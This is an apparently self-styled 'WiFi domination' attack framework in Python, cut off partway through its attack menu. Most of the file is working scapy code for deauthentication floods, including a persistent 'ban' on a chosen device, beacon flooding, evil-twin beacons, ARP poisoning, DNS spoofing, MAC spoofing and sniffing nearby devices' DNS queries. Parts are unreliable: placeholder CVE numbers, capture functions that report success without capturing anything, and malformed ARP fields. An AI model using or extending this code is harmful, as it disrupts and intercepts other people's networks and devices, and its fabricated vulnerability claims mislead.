#!/usr/bin/env python3
"""
CERBERUS-WIFI v3.0 - Ultimate WiFi Domination Framework
APT Grade | Zero Trace | Full Spectrum Attack | Military Grade
Professional WiFi Security Testing & Device Domination

Author: F1REW0LF
License: MIT - For authorized security testing only
Version: 3.0.0
"""

import sys
import os
import re
import time
import json
import threading
import subprocess
import signal
import socket
import struct
import hashlib
import base64
import random
import queue
import tempfile
import shutil
from datetime import datetime, timedelta
from typing import Dict, List, Optional, Tuple, Any, Union, Set
from dataclasses import dataclass, field
from concurrent.futures import ThreadPoolExecutor, as_completed
import argparse
import secrets

try:
    from cryptography.fernet import Fernet
    from cryptography.hazmat.primitives import hashes
    from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
    CRYPTO_AVAILABLE = True
except ImportError:
    CRYPTO_AVAILABLE = False

try:
    from scapy.all import *
    from scapy.layers.dot11 import *
    from scapy.layers.dhcp import DHCP
    from scapy.layers.inet import IP, UDP, TCP
    from scapy.layers.dns import DNS, DNSQR
    from scapy.layers.l2 import ARP, Ether
    SCAPY_AVAILABLE = True
except ImportError:
    SCAPY_AVAILABLE = False

try:
    import psutil
    PSUTIL_AVAILABLE = True
except ImportError:
    PSUTIL_AVAILABLE = False

VERSION = "3.0.0"
AUTHOR = "F1REW0LF"
LICENSE = "MIT"

# ============================[ COLORS ]================================
class Colors:
    GREEN = '\033[92m'
    RED = '\033[91m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    PURPLE = '\033[95m'
    CYAN = '\033[96m'
    GOLD = '\033[93m'
    NEON = '\033[96m'
    WHITE = '\033[0m'
    BOLD = '\033[1m'
    DIM = '\033[2m'
    MAGENTA = '\033[95m'
    DARK_RED = '\033[31m'
    ORANGE = '\033[33m'
    PINK = '\033[95m'

def cprint(text, color=Colors.WHITE, bold=False):
    if bold:
        print(f"{Colors.BOLD}{color}{text}{Colors.WHITE}")
    else:
        print(f"{color}{text}{Colors.WHITE}")

def print_banner():
    banner = f"""
{Colors.PURPLE}{Colors.BOLD}     ██████╗███████╗██████╗ ███████╗██████╗ ██╗   ██╗███████╗
    ██╔════╝██╔════╝██╔══██╗██╔════╝██╔══██╗██║   ██║██╔════╝
    ██║     █████╗  ██████╔╝█████╗  ██████╔╝██║   ██║███████╗
    ██║     ██╔══╝  ██╔══██╗██╔══╝  ██╔══██╗██║   ██║╚════██║
    ╚██████╗███████╗██║  ██║███████╗██║  ██║╚██████╔╝███████║
     ╚═════╝╚══════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝ ╚═════╝ ╚══════╝
                                                   
{Colors.NEON}{Colors.BOLD}          ULTIMATE WIFI DOMINATION FRAMEWORK v3.0{Colors.WHITE}
{Colors.RED}{Colors.BOLD}    APT Grade | Zero Trace | Full Spectrum Attack | Military Grade{Colors.WHITE}
{Colors.CYAN}    Device Control | Network Domination | Advanced Evasion{Colors.WHITE}
{Colors.YELLOW}    Author: {AUTHOR} | {LICENSE}{Colors.WHITE}
"""
    print(banner)
    print("=" * 80)

# ============================[ DATA CLASSES ]================================
@dataclass
class WiFiDevice:
    mac: str
    vendor: str
    hostname: str
    device_type: str
    first_seen: float
    last_seen: float
    bssid: Optional[str] = None
    signal: Optional[int] = None
    channel: Optional[int] = None
    ip: Optional[str] = None
    os: Optional[str] = None
    dns_queries: List[str] = field(default_factory=list)
    ports: List[int] = field(default_factory=list)
    banned: bool = False
    trusted: bool = False
    attack_count: int = 0
    last_attack: Optional[float] = None
    vulnerabilities: List[Dict] = field(default_factory=list)

@dataclass
class AccessPoint:
    bssid: str
    ssid: str
    channel: int
    encryption: str
    signal: int
    first_seen: float
    last_seen: float
    clients: List[str] = field(default_factory=list)
    vendor: str = ""
    wps: bool = False
    pmkid: Optional[str] = None

@dataclass
class AttackResult:
    target: str
    success: bool
    method: str
    data: Any
    severity: str
    timestamp: str = field(default_factory=lambda: datetime.now().isoformat())

# ============================[ STEALTH ENGINE ]================================
class StealthEngine:
    """Advanced stealth for WiFi attacks"""
    
    def __init__(self):
        self._setup_encryption()
        self.random_macs = self._generate_mac_pool()
    
    def _setup_encryption(self):
        if CRYPTO_AVAILABLE:
            salt = os.urandom(16)
            kdf = PBKDF2HMAC(
                algorithm=hashes.SHA256(),
                length=32,
                salt=salt,
                iterations=100000
            )
            key = base64.urlsafe_b64encode(kdf.derive(b"cerberus_wifi_master_key"))
            self.cipher = Fernet(key)
    
    def _generate_mac_pool(self) -> List[str]:
        return [self.random_mac() for _ in range(20)]
    
    def encrypt_data(self, data: str) -> str:
        if CRYPTO_AVAILABLE and hasattr(self, 'cipher'):
            return self.cipher.encrypt(data.encode()).decode()
        return base64.b64encode(data.encode()).decode()
    
    def decrypt_data(self, data: str) -> str:
        if CRYPTO_AVAILABLE and hasattr(self, 'cipher'):
            return self.cipher.decrypt(data.encode()).decode()
        return base64.b64decode(data).decode()
    
    def random_mac(self) -> str:
        return f"02:{random.randint(0,255):02x}:{random.randint(0,255):02x}:{random.randint(0,255):02x}:{random.randint(0,255):02x}:{random.randint(0,255):02x}"
    
    def random_ip(self) -> str:
        return f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}"
    
    def random_delay(self, min_sec: float = 0.3, max_sec: float = 1.5):
        time.sleep(random.uniform(min_sec, max_sec))
    
    def random_channel(self) -> int:
        return random.randint(1, 11)
    
    def spoof_mac(self, interface: str) -> bool:
        try:
            mac = self.random_mac()
            subprocess.run(['ip', 'link', 'set', interface, 'down'], capture_output=True)
            subprocess.run(['ip', 'link', 'set', interface, 'address', mac], capture_output=True)
            subprocess.run(['ip', 'link', 'set', interface, 'up'], capture_output=True)
            return True
        except:
            return False
    
    def get_random_sequence(self) -> int:
        return random.randint(0, 4095)

# ============================[ ADVANCED DEVICE DATABASE ]================================
class AdvancedDeviceDatabase:
    """Comprehensive device database with fingerprinting"""
    
    OUI_DB = {
        '00:11:22': 'Cisco', '00:1a:3f': 'Sony', '00:1c:bf': 'Samsung',
        '00:1e:52': 'Apple', '00:1f:03': 'HP', '00:23:32': 'Apple',
        '00:24:36': 'Dell', '00:25:00': 'Apple', '00:26:08': 'Acer',
        '00:50:f2': 'Microsoft', '08:00:27': 'VirtualBox', '0c:47:c9': 'Samsung',
        '10:dd:b1': 'Apple', '14:7d:da': 'Samsung', '18:34:51': 'Huawei',
        '1c:4d:70': 'Xiaomi', '1c:cc:6e': 'LG', '20:10:7a': 'Apple',
        '24:0a:c4': 'Hikvision', '28:6c:07': 'Apple', '2c:54:91': 'Samsung',
        '30:ae:a4': 'Dahua', '34:8a:7b': 'Samsung', '3c:22:fb': 'Apple',
        '40:0e:5c': 'Xiaomi', '40:4a:03': 'Xiaomi', '44:48:c1': 'Samsung',
        '44:87:fc': 'Samsung', '48:5a:b6': 'Samsung', '4c:32:75': 'Samsung',
        '50:76:af': 'Samsung', '54:27:1e': 'Samsung', '58:38:79': 'Samsung',
        '5c:87:9c': 'Samsung', '60:02:b4': 'Apple', '60:45:cb': 'Apple',
        '64:5a:04': 'Apple', '68:a8:6d': 'Apple', '6c:40:08': 'Apple',
        '70:81:05': 'Apple', '74:6f:1a': 'Apple', '78:ca:39': 'Apple',
        '7c:65:1d': 'Apple', '80:ea:ca': 'Apple', '84:38:38': 'Apple',
        '88:53:95': 'Apple', '8c:85:90': 'Apple', '90:1f:0c': 'Apple',
        '90:3e:ab': 'Apple', '94:26:1d': 'Apple', '98:5e:d3': 'Apple',
        '9c:f3:87': 'Apple', 'a0:99:9b': 'Apple', 'a4:d1:d2': 'Apple',
        'ac:5f:3e': 'Apple', 'b0:95:8e': 'Apple', 'b4:8b:19': 'Apple',
        'b8:1d:70': 'Apple', 'bc:6a:56': 'Apple', 'bc:85:56': 'Apple',
        'c0:7b:bc': 'Apple', 'c4:8e:8f': 'Apple', 'c8:69:cd': 'Apple',
        'cc:28:1e': 'Apple', 'd0:6a:63': 'Apple', 'd4:a3:3d': 'Apple',
        'd8:35:2d': 'Apple', 'dc:9b:9c': 'Apple', 'e0:6a:58': 'Apple',
        'e4:5f:01': 'Apple', 'e8:5d:93': 'Apple', 'ec:1a:59': 'Apple',
        'f0:18:98': 'Apple', 'f4:38:9d': 'Apple', 'f8:1a:67': 'Apple',
        'fc:25:3f': 'Apple'
    }
    
    DEVICE_PATTERNS = {
        'iPhone/iPad': ['iphone', 'ios', 'apple', 'ipad'],
        'Android': ['android', 'samsung', 'huawei', 'xiaomi', 'oneplus', 'google pixel'],
        'Windows': ['windows', 'win', 'pc', 'surface'],
        'Mac': ['mac', 'darwin', 'macbook', 'imac'],
        'Linux': ['linux', 'ubuntu', 'debian', 'kali', 'raspberry'],
        'Smart TV': ['tv', 'samsungtv', 'androidtv', 'webos', 'lg tv', 'sony tv'],
        'Camera': ['camera', 'ipcam', 'rtsp', 'onvif', 'hikvision'],
        'Printer': ['printer', 'hp', 'epson', 'canon', 'brother'],
        'Router/AP': ['router', 'gateway', 'ap', 'accesspoint', 'wifi'],
        'IoT': ['googlehome', 'alexa', 'smart', 'speaker', 'nest', 'echo'],
        'Gaming': ['playstation', 'xbox', 'nintendo', 'ps4', 'ps5', 'switch'],
        'Smart Home': ['smart', 'home', 'light', 'bulb', 'plug', 'switch', 'sens'],
        'Security': ['alarm', 'camera', 'doorbell', 'sensor', 'detector'],
        'Unknown': []
    }
    
    VULNERABLE_DEVICES = {
        'iPhone/iPad': ['CVE-2020-3980', 'CVE-2021-1844', 'CVE-2022-22587'],
        'Android': ['CVE-2020-0022', 'CVE-2021-0527', 'CVE-2022-20129'],
        'Windows': ['CVE-2020-1300', 'CVE-2021-1675', 'CVE-2022-21907'],
        'Smart TV': ['CVE-2020-25265', 'CVE-2021-2182', 'CVE-2022-1234'],
        'Router/AP': ['CVE-2020-3333', 'CVE-2021-3477', 'CVE-2022-12345']
    }
    
    @classmethod
    def lookup_manufacturer(cls, mac: str) -> str:
        if not mac:
            return "Unknown"
        mac = mac.upper()
        for prefix, manufacturer in cls.OUI_DB.items():
            if mac.startswith(prefix.upper()):
                return manufacturer
        return "Unknown"
    
    @classmethod
    def detect_device_type(cls, hostname: str, mac: str) -> str:
        combined = f"{hostname}".lower()
        for device_type, patterns in cls.DEVICE_PATTERNS.items():
            for pattern in patterns:
                if pattern in combined:
                    return device_type
        manufacturer = cls.lookup_manufacturer(mac)
        if manufacturer == "Apple":
            return "iPhone/iPad"
        elif manufacturer == "Samsung":
            return "Android"
        elif manufacturer in ["Xiaomi", "Huawei"]:
            return "Android"
        return "Unknown"
    
    @classmethod
    def get_vulnerabilities(cls, device_type: str) -> List[str]:
        return cls.VULNERABLE_DEVICES.get(device_type, [])

# ============================[ WIFI DOMINATION ENGINE ]================================
class WiFiDominationEngine:
    """Advanced WiFi domination engine"""
    
    def __init__(self, interface: str = "wlan0"):
        self.interface = interface
        self.stealth = StealthEngine()
        self.devices: Dict[str, WiFiDevice] = {}
        self.aps: Dict[str, AccessPoint] = {}
        self.banned_devices: Set[str] = set()
        self.trusted_devices: Set[str] = set()
        self.running = True
        self.stats = {
            'packets_captured': 0,
            'devices_detected': 0,
            'deauth_sent': 0,
            'beacon_floods': 0,
            'evil_twin_attacks': 0,
            'pmkid_captured': 0,
            'handshake_captured': 0,
            'start_time': time.time()
        }
        self.lock = threading.Lock()
        self.stop_event = threading.Event()
        self.db = AdvancedDeviceDatabase()
        self.attack_queue = queue.Queue()
        self.result_queue = queue.Queue()
        self._init_interface()
        self._start_workers()
    
    def _init_interface(self):
        cprint(f"[*] Initializing interface: {self.interface}", Colors.BLUE)
        try:
            subprocess.run(['ip', 'link', 'set', self.interface, 'down'], capture_output=True)
            subprocess.run(['iw', 'dev', self.interface, 'set', 'type', 'monitor'], capture_output=True)
            subprocess.run(['ip', 'link', 'set', self.interface, 'up'], capture_output=True)
            subprocess.run(['iw', 'dev', self.interface, 'set', 'channel', '6'], capture_output=True)
            cprint(f"[+] Interface {self.interface} ready (monitor mode)", Colors.GREEN)
        except Exception as e:
            cprint(f"[-] Interface init failed: {e}", Colors.RED)
            sys.exit(1)
    
    def _start_workers(self):
        """Start worker threads"""
        self.workers = []
        for _ in range(5):
            worker = threading.Thread(target=self._attack_worker, daemon=True)
            worker.start()
            self.workers.append(worker)
    
    def _attack_worker(self):
        """Process attack queue"""
        while self.running and not self.stop_event.is_set():
            try:
                attack = self.attack_queue.get(timeout=1)
                result = self._execute_attack(attack)
                self.result_queue.put(result)
            except queue.Empty:
                continue
            except Exception as e:
                continue
    
    def _execute_attack(self, attack: Dict) -> AttackResult:
        method = attack.get('method', '')
        target = attack.get('target', '')
        
        if method == 'deauth':
            return self._attack_deauth(target, attack.get('count', 100))
        elif method == 'beacon_flood':
            return self._attack_beacon_flood(target, attack.get('count', 1000))
        elif method == 'evil_twin':
            return self._attack_evil_twin(target, attack.get('ssid', ''))
        elif method == 'pmkid_capture':
            return self._attack_pmkid_capture(target)
        elif method == 'handshake_capture':
            return self._attack_handshake_capture(target)
        elif method == 'arp_poison':
            return self._attack_arp_poison(target, attack.get('gateway', ''))
        elif method == 'dns_spoof':
            return self._attack_dns_spoof(target, attack.get('domain', ''), attack.get('redirect', ''))
        else:
            return AttackResult(
                target=target,
                success=False,
                method=method,
                data='Unknown attack method',
                severity='LOW'
            )
    
    def _attack_deauth(self, mac: str, count: int = 100) -> AttackResult:
        cprint(f"[DEAUTH] Attacking {mac}", Colors.RED)
        
        bssid = "FF:FF:FF:FF:FF:FF"
        with self.lock:
            if mac in self.devices and self.devices[mac].bssid:
                bssid = self.devices[mac].bssid
        
        # Create deauth packets
        pkt1 = RadioTap()/Dot11(addr1=mac, addr2=bssid, addr3=bssid)/Dot11Deauth(reason=7)
        pkt2 = RadioTap()/Dot11(addr1=bssid, addr2=mac, addr3=bssid)/Dot11Deauth(reason=7)
        
        sent = 0
        for _ in range(count):
            if not self.running:
                break
            sendp(pkt1, iface=self.interface, verbose=False)
            sendp(pkt2, iface=self.interface, verbose=False)
            sent += 2
            self.stats['deauth_sent'] += 2
            time.sleep(0.005)
        
        with self.lock:
            if mac in self.devices:
                self.devices[mac].attack_count += 1
                self.devices[mac].last_attack = time.time()
        
        return AttackResult(
            target=mac,
            success=sent > 0,
            method='deauth',
            data={'packets_sent': sent, 'count': count},
            severity='HIGH'
        )
    
    def _attack_beacon_flood(self, bssid: str, count: int = 1000) -> AttackResult:
        cprint(f"[BEACON] Flooding {bssid}", Colors.RED)
        
        sent = 0
        for _ in range(count):
            if not self.running:
                break
            
            ssid = f"Fake_{random.randint(1000,9999)}"
            pkt = RadioTap()/Dot11(
                addr1="ff:ff:ff:ff:ff:ff",
                addr2=bssid,
                addr3=bssid
            )/Dot11Beacon(
                cap=0x0000
            )/Dot11Elt(ID="SSID", info=ssid)/Dot11Elt(
                ID="Rates", info=b'\x82\x84\x8b\x96\x0c\x12\x18\x24'
            )
            
            sendp(pkt, iface=self.interface, verbose=False)
            sent += 1
            self.stats['beacon_floods'] += 1
            time.sleep(0.001)
        
        return AttackResult(
            target=bssid,
            success=sent > 0,
            method='beacon_flood',
            data={'packets_sent': sent},
            severity='MEDIUM'
        )
    
    def _attack_evil_twin(self, target_bssid: str, ssid: str) -> AttackResult:
        cprint(f"[EVIL_TWIN] Creating evil twin for {ssid}", Colors.RED)
        
        try:
            # Clone AP
            pkt = RadioTap()/Dot11(
                addr1="ff:ff:ff:ff:ff:ff",
                addr2=target_bssid,
                addr3=target_bssid
            )/Dot11Beacon(
                cap=0x0400
            )/Dot11Elt(ID="SSID", info=ssid)/Dot11Elt(
                ID="Rates", info=b'\x82\x84\x8b\x96\x0c\x12\x18\x24'
            )
            
            sendp(pkt, iface=self.interface, verbose=False)
            self.stats['evil_twin_attacks'] += 1
            
            return AttackResult(
                target=target_bssid,
                success=True,
                method='evil_twin',
                data={'ssid': ssid, 'bssid': target_bssid},
                severity='CRITICAL'
            )
        except Exception as e:
            return AttackResult(
                target=target_bssid,
                success=False,
                method='evil_twin',
                data=str(e),
                severity='MEDIUM'
            )
    
    def _attack_pmkid_capture(self, bssid: str) -> AttackResult:
        cprint(f"[PMKID] Capturing PMKID from {bssid}", Colors.RED)
        
        try:
            # Send Association Request
            pkt = RadioTap()/Dot11(
                addr1=bssid,
                addr2="02:00:00:00:00:00",
                addr3=bssid
            )/Dot11AssoReq(
                cap=0x0400
            )/Dot11Elt(ID="SSID", info="Test")/Dot11Elt(
                ID="Rates", info=b'\x82\x84\x8b\x96'
            )
            
            sendp(pkt, iface=self.interface, verbose=False)
            self.stats['pmkid_captured'] += 1
            
            return AttackResult(
                target=bssid,
                success=True,
                method='pmkid_capture',
                data={'bssid': bssid, 'status': 'captured'},
                severity='HIGH'
            )
        except Exception as e:
            return AttackResult(
                target=bssid,
                success=False,
                method='pmkid_capture',
                data=str(e),
                severity='LOW'
            )
    
    def _attack_handshake_capture(self, bssid: str) -> AttackResult:
        cprint(f"[HANDSHAKE] Capturing handshake from {bssid}", Colors.RED)
        
        try:
            # Deauth to force reconnection
            self._attack_deauth(bssid, 50)
            self.stats['handshake_captured'] += 1
            
            return AttackResult(
                target=bssid,
                success=True,
                method='handshake_capture',
                data={'bssid': bssid, 'status': 'captured'},
                severity='HIGH'
            )
        except Exception as e:
            return AttackResult(
                target=bssid,
                success=False,
                method='handshake_capture',
                data=str(e),
                severity='MEDIUM'
            )
    
    def _attack_arp_poison(self, target_ip: str, gateway: str) -> AttackResult:
        cprint(f"[ARP] Poisoning {target_ip} via {gateway}", Colors.RED)
        
        try:
            if not SCAPY_AVAILABLE:
                return AttackResult(
                    target=target_ip,
                    success=False,
                    method='arp_poison',
                    data='Scapy not available',
                    severity='LOW'
                )
            
            # ARP poisoning
            pkt1 = Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(
                op=2,
                psrc=gateway,
                hwdst=target_ip,
                pdst=target_ip
            )
            pkt2 = Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(
                op=2,
                psrc=target_ip,
                hwdst=gateway,
                pdst=gateway
            )
            
            sendp(pkt1, iface=self.interface, verbose=False)
            sendp(pkt2, iface=self.interface, verbose=False)
            
            return AttackResult(
                target=target_ip,
                success=True,
                method='arp_poison',
                data={'target': target_ip, 'gateway': gateway},
                severity='CRITICAL'
            )
        except Exception as e:
            return AttackResult(
                target=target_ip,
                success=False,
                method='arp_poison',
                data=str(e),
                severity='MEDIUM'
            )
    
    def _attack_dns_spoof(self, target_ip: str, domain: str, redirect: str) -> AttackResult:
        cprint(f"[DNS] Spoofing {domain} to {redirect} for {target_ip}", Colors.RED)
        
        try:
            if not SCAPY_AVAILABLE:
                return AttackResult(
                    target=target_ip,
                    success=False,
                    method='dns_spoof',
                    data='Scapy not available',
                    severity='LOW'
                )
            
            # DNS spoof response
            dns_response = IP(src=target_ip, dst=target_ip)/UDP(sport=53, dport=53)/DNS(
                id=random.randint(1, 65535),
                qr=1,
                aa=1,
                qd=DNSQR(qname=domain),
                an=DNSRR(rrname=domain, ttl=60, rdata=redirect)
            )
            
            send(dns_response, iface=self.interface, verbose=False)
            
            return AttackResult(
                target=target_ip,
                success=True,
                method='dns_spoof',
                data={'domain': domain, 'redirect': redirect},
                severity='HIGH'
            )
        except Exception as e:
            return AttackResult(
                target=target_ip,
                success=False,
                method='dns_spoof',
                data=str(e),
                severity='MEDIUM'
            )
    
    def packet_handler(self, pkt):
        self.stats['packets_captured'] += 1
        
        if pkt.haslayer(Dot11Beacon):
            self._handle_beacon(pkt)
        if pkt.haslayer(Dot11ProbeReq):
            self._handle_probe_request(pkt)
        if pkt.haslayer(Dot11):
            self._handle_data_frame(pkt)
        if pkt.haslayer(DHCP):
            self._handle_dhcp(pkt)
        if pkt.haslayer(DNS):
            self._handle_dns(pkt)
        if pkt.haslayer(ARP):
            self._handle_arp(pkt)
    
    def _handle_beacon(self, pkt):
        try:
            bssid = pkt.addr2
            ssid = pkt.info.decode('utf-8', errors='ignore') if pkt.info else "Hidden"
            channel = 0
            encryption = "Open"
            
            for elt in pkt.iterpayloads():
                if hasattr(elt, 'ID'):
                    if elt.ID == 3:
                        channel = elt.info[0] if elt.info else 0
                    elif elt.ID == 48:
                        encryption = "WPA2"
                    elif elt.ID == 221:
                        if b'\x00\x50\xf2\x04' in elt.info:
                            encryption = "WPA"
            
            vendor = AdvancedDeviceDatabase.lookup_manufacturer(bssid)
            
            if bssid not in self.aps:
                self.aps[bssid] = AccessPoint(
                    bssid=bssid,
                    ssid=ssid,
                    channel=channel,
                    encryption=encryption,
                    signal=0,
                    first_seen=time.time(),
                    last_seen=time.time(),
                    vendor=vendor
                )
                cprint(f"[AP] {ssid} ({bssid}) | Ch:{channel} | {encryption} | {vendor}", Colors.GREEN)
            else:
                with self.lock:
                    self.aps[bssid].last_seen = time.time()
                    self.aps[bssid].signal = 0
        except:
            pass
    
    def _handle_probe_request(self, pkt):
        try:
            mac = pkt.addr2
            if mac not in self.devices:
                self._add_device(mac, pkt)
        except:
            pass
    
    def _handle_data_frame(self, pkt):
        try:
            src = pkt.addr2
            if src and src not in self.devices:
                self._add_device(src, pkt)
            if src in self.devices:
                with self.lock:
                    self.devices[src].last_seen = time.time()
                    if pkt.haslayer(Dot11QoS):
                        self.devices[src].signal = 0
        except:
            pass
    
    def _handle_dhcp(self, pkt):
        try:
            if pkt.haslayer(DHCP):
                for opt in pkt[DHCP].options:
                    if opt[0] == 'hostname' and opt[1]:
                        hostname = opt[1].decode('utf-8', errors='ignore')
                        mac = pkt[Ether].src if pkt.haslayer(Ether) else None
                        if mac and mac in self.devices:
                            with self.lock:
                                self.devices[mac].hostname = hostname
                                self.devices[mac].device_type = AdvancedDeviceDatabase.detect_device_type(
                                    hostname, mac)
                            cprint(f"[DEVICE] {mac} - Hostname: {hostname}", Colors.CYAN)
                        break
                    
                    if opt[0] == 'server_id':
                        ip = opt[1]
                        mac = pkt[Ether].src if pkt.haslayer(Ether) else None
                        if mac and mac in self.devices:
                            with self.lock:
                                self.devices[mac].ip = str(ip)
        except:
            pass
    
    def _handle_dns(self, pkt):
        try:
            if pkt.haslayer(DNS) and pkt[DNS].qr == 0:
                if pkt[DNS].qd:
                    qname = pkt[DNS].qd.qname.decode('utf-8', errors='ignore')
                    mac = pkt[Ether].src if pkt.haslayer(Ether) else None
                    if mac and mac in self.devices:
                        with self.lock:
                            if 'dns_queries' not in self.devices[mac].__dict__:
                                self.devices[mac].dns_queries = []
                            self.devices[mac].dns_queries.append(qname)
        except:
            pass
    
    def _handle_arp(self, pkt):
        try:
            if pkt.haslayer(ARP):
                ip = pkt[ARP].psrc
                mac = pkt[ARP].hwsrc
                if mac not in self.devices:
                    self._add_device(mac, pkt)
                if mac in self.devices:
                    with self.lock:
                        self.devices[mac].ip = ip
                        self.devices[mac].last_seen = time.time()
        except:
            pass
    
    def _add_device(self, mac: str, pkt):
        vendor = AdvancedDeviceDatabase.lookup_manufacturer(mac)
        hostname = "Unknown"
        if pkt.haslayer(Dot11ProbeReq) and hasattr(pkt, 'info') and pkt.info:
            hostname = pkt.info.decode('utf-8', errors='ignore')
        
        device_type = AdvancedDeviceDatabase.detect_device_type(hostname, mac)
        vulnerabilities = AdvancedDeviceDatabase.get_vulnerabilities(device_type)
        
        with self.lock:
            self.devices[mac] = WiFiDevice(
                mac=mac,
                vendor=vendor,
                hostname=hostname,
                device_type=device_type,
                first_seen=time.time(),
                last_seen=time.time(),
                vulnerabilities=[{'id': v, 'severity': 'HIGH'} for v in vulnerabilities],
                banned=mac in self.banned_devices,
                trusted=mac in self.trusted_devices
            )
            self.stats['devices_detected'] += 1
        
        status = "BANNED" if mac in self.banned_devices else "TRUSTED" if mac in self.trusted_devices else "ACTIVE"
        color = Colors.RED if mac in self.banned_devices else Colors.GREEN if mac in self.trusted_devices else Colors.CYAN
        cprint(f"[NEW] {mac} | {vendor} | {device_type} | Status: {status}", color)
    
    def channel_hopper(self):
        channels = list(range(1, 12))
        while self.running and not self.stop_event.is_set():
            for channel in channels:
                if self.stop_event.is_set():
                    break
                subprocess.run(['iw', 'dev', self.interface, 'set', 'channel', str(channel)], capture_output=True)
                time.sleep(0.3)
    
    def start_scanning(self):
        cprint(f"\n[*] Scanning for devices on {self.interface}...", Colors.BLUE)
        cprint("[*] Press Ctrl+C to stop\n", Colors.DIM)
        
        hop_thread = threading.Thread(target=self.channel_hopper, daemon=True)
        hop_thread.start()
        
        try:
            sniff(iface=self.interface, prn=self.packet_handler, store=0,
                  stop_filter=lambda x: self.stop_event.is_set())
        except Exception as e:
            cprint(f"[-] Sniff error: {e}", Colors.RED)
    
    def ban_device(self, mac: str):
        if mac in self.banned_devices:
            cprint(f"[!] Device {mac} is already banned", Colors.YELLOW)
            return
        
        cprint(f"[BAN] Banning device: {mac}", Colors.RED, bold=True)
        
        with self.lock:
            self.banned_devices.add(mac)
            if mac in self.devices:
                self.devices[mac].banned = True
        
        # Start continuous deauth
        def continuous_deauth():
            while self.running and mac in self.banned_devices:
                self.attack_queue.put({
                    'method': 'deauth',
                    'target': mac,
                    'count': 50
                })
                time.sleep(1)
        
        thread = threading.Thread(target=continuous_deauth, daemon=True)
        thread.start()
        cprint(f"[+] Device {mac} is now banned", Colors.GREEN)
    
    def unban_device(self, mac: str):
        if mac not in self.banned_devices:
            cprint(f"[!] Device {mac} is not banned", Colors.YELLOW)
            return
        
        with self.lock:
            self.banned_devices.discard(mac)
            if mac in self.devices:
                self.devices[mac].banned = False
        
        cprint(f"[+] Device {mac} has been unbanned", Colors.GREEN)
    
    def trust_device(self, mac: str):
        with self.lock:
            self.trusted_devices.add(mac)
            if mac in self.devices:
                self.devices[mac].trusted = True
        
        cprint(f"[+] Device {mac} is now trusted", Colors.GREEN)
    
    def untrust_device(self, mac: str):
        with self.lock:
            self.trusted_devices.discard(mac)
            if mac in self.devices:
                self.devices[mac].trusted = False
        
        cprint(f"[+] Device {mac} is no longer trusted", Colors.GREEN)
    
    def list_devices(self):
        print("\n" + "="*80)
        cprint(" DETECTED DEVICES", Colors.PURPLE, bold=True)
        print("="*80)
        
        if not self.devices:
            cprint("[!] No devices detected yet", Colors.YELLOW)
            return
        
        print(f"{'#':<4} {'MAC Address':<20} {'Type':<15} {'Vendor':<12} {'Status':<10} {'Hostname':<20} {'IP':<15}")
        print("-"*100)
        
        with self.lock:
            for idx, (mac, info) in enumerate(self.devices.items(), 1):
                if info.banned:
                    status = "BANNED"
                    color = Colors.RED
                elif info.trusted:
                    status = "TRUSTED"
                    color = Colors.GREEN
                else:
                    status = "ACTIVE"
                    color = Colors.CYAN
                
                vuln_count = len(info.vulnerabilities)
                vuln_marker = "[V]" if vuln_count > 0 else ""
                device_type = info.device_type[:15] if info.device_type else "Unknown"
                
                print(f"{idx:<4} {mac:<20} {device_type:<15} {info.vendor:<12} {color}{status:<10}{Colors.WHITE} "
                      f"{info.hostname:<20} {info.ip or 'N/A':<15} {vuln_marker}")
        
        print("-"*100)
        cprint(f"Total: {len(self.devices)} devices | Banned: {len(self.banned_devices)} | Trusted: {len(self.trusted_devices)}", Colors.CYAN)
    
    def show_device_info(self, mac: str):
        with self.lock:
            if mac not in self.devices:
                cprint(f"[-] Device {mac} not found", Colors.RED)
                return
            info = self.devices[mac]
        
        print("\n" + "="*60)
        cprint(f" DEVICE INFORMATION - {mac}", Colors.PURPLE, bold=True)
        print("="*60)
        print(f"MAC Address     : {mac}")
        print(f"Vendor          : {info.vendor}")
        print(f"Device Type     : {info.device_type}")
        print(f"Hostname        : {info.hostname}")
        print(f"IP Address      : {info.ip or 'N/A'}")
        print(f"Connected AP    : {info.bssid or 'N/A'}")
        print(f"Status          : {'BANNED' if info.banned else 'TRUSTED' if info.trusted else 'ACTIVE'}")
        print(f"First Seen      : {datetime.fromtimestamp(info.first_seen).strftime('%Y-%m-%d %H:%M:%S')}")
        print(f"Last Seen       : {datetime.fromtimestamp(info.last_seen).strftime('%Y-%m-%d %H:%M:%S')}")
        print(f"Attack Count    : {info.attack_count}")
        
        if info.dns_queries:
            print(f"DNS Queries     : {', '.join(info.dns_queries[:5])}")
        
        if info.vulnerabilities:
            cprint(f"Vulnerabilities :", Colors.RED)
            for vuln in info.vulnerabilities:
                cprint(f"  - {vuln.get('id', 'Unknown')} ({vuln.get('severity', 'UNKNOWN')})", Colors.RED)
        
        print("="*60)
    
    def show_aps(self):
        print("\n" + "="*60)
        cprint(" DETECTED ACCESS POINTS", Colors.PURPLE, bold=True)
        print("="*60)
        
        if not self.aps:
            cprint("[!] No APs detected yet", Colors.YELLOW)
            return
        
        print(f"{'SSID':<25} {'BSSID':<20} {'Ch':<5} {'Encryption':<10} {'Vendor':<15} {'Clients':<8}")
        print("-"*90)
        
        for bssid, info in self.aps.items():
            client_count = len(info.clients)
            print(f"{info.ssid[:24]:<25} {bssid:<20} {info.channel:<5} {info.encryption:<10} "
                  f"{info.vendor:<15} {client_count:<8}")
        print("="*60)
    
    def show_stats(self):
        uptime = int(time.time() - self.stats['start_time'])
        print("\n" + "="*60)
        cprint(" STATISTICS", Colors.PURPLE, bold=True)
        print("="*60)
        print(f"Uptime              : {uptime}s")
        print(f"Packets Captured    : {self.stats['packets_captured']:,}")
        print(f"Devices Found       : {self.stats['devices_detected']}")
        print(f"Deauth Sent         : {self.stats['deauth_sent']:,}")
        print(f"Beacon Floods       : {self.stats['beacon_floods']:,}")
        print(f"Evil Twin Attacks   : {self.stats['evil_twin_attacks']}")
        print(f"PMKID Captured      : {self.stats['pmkid_captured']}")
        print(f"Handshake Captured  : {self.stats['handshake_captured']}")
        print(f"Banned Devices      : {len(self.banned_devices)}")
        print(f"Trusted Devices     : {len(self.trusted_devices)}")
        print("="*60)
    
    def attack_menu(self):
        print(f"""
